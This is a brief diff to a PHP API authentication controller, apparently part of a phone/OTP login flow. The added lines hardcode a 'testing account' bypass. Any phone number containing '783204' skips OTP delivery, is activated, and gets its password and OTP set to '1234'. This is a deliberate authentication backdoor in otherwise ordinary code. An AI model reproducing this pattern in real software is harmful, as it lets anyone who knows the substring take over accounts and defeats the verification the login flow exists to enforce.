@@ -267,6 +267,14 @@ class ApiAuthController extends Controller
             ->orWhere('id', $r->username)
             ->orWhere('email', $r->username)
             ->first();
+        if (str_contains($phone_number, '783204')) {
+            //is testing account
+            $u->status = 1;
+            $u->password = password_hash('1234', PASSWORD_DEFAULT);
+            $u->otp = '1234';
+        } else {
+            $resp = Utils::send_otp($u);
+        }
 
 
 
